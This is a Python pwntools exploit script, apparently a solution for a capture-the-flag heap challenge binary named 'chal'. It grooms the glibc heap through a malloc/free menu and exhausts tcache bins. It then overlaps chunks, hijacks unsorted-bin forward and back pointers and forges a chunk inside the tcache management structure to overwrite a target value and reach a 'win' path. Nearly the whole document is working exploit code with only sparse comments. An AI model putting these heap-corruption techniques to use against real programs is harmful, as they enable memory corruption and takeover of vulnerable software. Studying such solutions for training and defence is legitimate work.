```py
#!/usr/bin/env python3
from pwn import *

elf = ELF('./chal')

alloc_count = -1

def menu():
    return p.recvuntil(b'> ')

def malloc(size, data, offset=0):
    global alloc_count
    print("[%s]malloc(%s)" % (alloc_count+1, hex(size)))
    p.sendline(b'1')
    p.sendlineafter(b'Allocation size: ', str(size).encode())
    p.sendlineafter(b'Write offset: ', str(offset).encode())
    p.sendafter(b'Data for buffer: ', data)
    alloc_count += 1
    menu()
    return alloc_count

def free(idx):
    print("free(%s)" % idx)
    p.sendline(b'2')
    p.sendlineafter(b'Free idx: ', str(idx).encode())
    menu()

p = process(elf.path)
menu()


#####################################
#           Prep allocations        #
#####################################

# This is the chunk size we will be working with for the unsorted bin hijack
mal_size = 0x88

head_chks = []
head_chks.append(malloc(0x18, b'head'))
overlap_win = malloc(0x18, 'head')
head_chks.append(overlap_win)
overlap_next = malloc(0x18, b'head')
head_chks.append(overlap_next)
win_chk_overlap = malloc(0x18, b'head')
head_chks.append(win_chk_overlap)
head_chks.append(malloc(mal_size, b'head_last'))
init_first = malloc(0x108, b'init_first')
win_chk = malloc(0x18, b'win_chk')

# Make allocations for exhausting t-cache for later
tcache_0x90 = []
tcache_0x1b0 = []
tcache_0x20 = []
for i in range(7):
    tcache_0x90.append(malloc(mal_size, b'TCACHE_FUEL'))
for i in range(7):
    tcache_0x1b0.append(malloc(0x1a8, b'TCACHE_FUEL'))
for i in range(7):
    tcache_0x20.append(malloc(0x18, b'TCACHE_FUEL'))

# Set 0x10001 in heap above 0x20 and 0x30 t-cache list
free(malloc(0x3d8, b'LSB OF FAKE CHUNK SIZE'))
free(malloc(0x3e8, b'MSB OF FAKE CHUNK SIZE'))

# Prep the allocation for two large unosrted bin entries with the ability
# to create a UAF
malloc(0x18, b'GUARD 1')
a1 = malloc(mal_size, b'A1'*(mal_size//2))
b1 = malloc(mal_size, b'B1'*(mal_size//2))
c1 = malloc(mal_size, b'C1'*(mal_size//2))
d1 = malloc(mal_size, b'D1'*(mal_size//2))
malloc(0x18, b'GUARD 2')
a2 = malloc(mal_size, b'A2'*(mal_size//2))
b2 = malloc(mal_size, b'B2'*(mal_size//2))
c2 = malloc(mal_size, b'C2'*(mal_size//2))
d2 = malloc(mal_size, b'D2'*(mal_size//2))
malloc(0x18, b'GUARD 3')

# Fill up the 0x90 t-cache
for i in tcache_0x90:
    free(i)

# Fill up the 0x20 t-cache
for i in tcache_0x20:
    free(i)

for head in head_chks:
    free(head)
#first = malloc(0x108, b'first')
malloc(0x500, b'large')
first = malloc(0x108, p64(0)*2 + p64(0)+p64(0x341) + p64(0)*2 + p64(0)+p64(0x350))
#gdb.attach(p)

#########################################################
#           Create the UAF setup for later              #
#########################################################
free(a1)
free(b1)
free(c1)

free(a2)
free(b2)
free(c2)


#gdb.attach(p)

unsorted2 = malloc(0x1a8, b'2'*0x118+p64(0x331))
unsorted1 = malloc(0x1a8, b'1'*0x118+p64(0x321))

free(c1) # 0x21 t-cache entry
free(c2) # 0x31 t-cache entry
free(unsorted2)
free(unsorted1)

unsorted1 = malloc(0x1a8, b'1'*mal_size+p64(0xe1))
unsorted2 = malloc(0x1a8, b'2'*mal_size+p64(0xf1))

# exhaust t-cache for later use
for i in tcache_0x1b0:
    free(i)

free(b1) # 0xe1 chunk entry
free(b2) # 0xf1 chunk entry
#########################################################
#       Fit the unsorted chunks to fit in the UAF       #
#########################################################

# Fit unsorted 1
free(unsorted1)
free(d1)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f1 = malloc(0x108, b'Y'*mal_size)

# Fit unsorted 2
free(unsorted2)
free(d2)

malloc(0x38, b'X')
malloc(0x48, b'X')
malloc(0x38, b'X')
malloc(0x58, b'X')

unsorted_f2 = malloc(0x108, b'Z'*mal_size)

unsorted_f3 = malloc(0x108, b'X'*mal_size) # This will be hijacked

#################################################################
#               Create the two unsorted entries                 #
#################################################################
tcache_0x110 = []
for i in range(8):
    tcache_0x110.append(malloc(0x108, b'^'*0x108))
for i in tcache_0x110:
    free(i)

#################################################################################
#   Make the entry in the mgmt chunk a valid chunk by making the size 0x10000   #
#   and making a valid size next to it with prev_in_use set to 0                #
#################################################################################

for i in range(36):
    malloc(0x5f8, b'Z'*0x5f8)
malloc(0x5f8, b'A'*0xd0+p64(0x10000)+p64(0x20))

###############
# Free chunks #
###############

free(unsorted_f1) # Start of unsorted bin

#free(unsorted_f3) # This will be hijacked for later
free(first)

free(unsorted_f2) # End of unsorted bin
malloc(0x500, b'large')


#############################################################################################
# Change the FWD and BCK pointers of the unsorted bin entires to our faked chunk in mgmt    #
#############################################################################################

malloc(0xd8, p8(0x00), 0xa8) # BCK
malloc(0xe8, p8(0x00), 0xa0) # FWD 

#free(cons) # free the chunk to be hijacked

free(overlap_win) # free the chunk to be hijacked


for _ in range(7):
    malloc(0x108, b'%')

_ = malloc(0x108, b'&')
_ = malloc(0x108, b'%')

#gdb.attach(p)
tcache_overlap = malloc(0x108, p64(0)+p64(0x201) + p8(0x20))

mgmt = malloc(0x330, p64(0)+p64(0x371), 0x70)
free(mgmt)

mgmt = malloc(0x1f8, p64(0)+p64(0x381), 0x90)
free(mgmt)

free(first)

mgmt = malloc(0x1f8, p8(0xa0), 0x20)

#gdb.attach(p)
win = malloc(0x370, b'win')

tmp = malloc(0x360, 'temp')

free(tmp)
free(win)

free(mgmt)

mgmt = malloc(0x1f8, p8(0x40), 0x18)

garbage = malloc(0x360, b'garbage')

prep = malloc(0x360, p64(0x37C3C7F))

#free(first)
#gdb.attach(p)
#p.interactive()

###############
# $$$ WIN $$$ #
###############
p.sendline(b'3')

p.interactive()
```
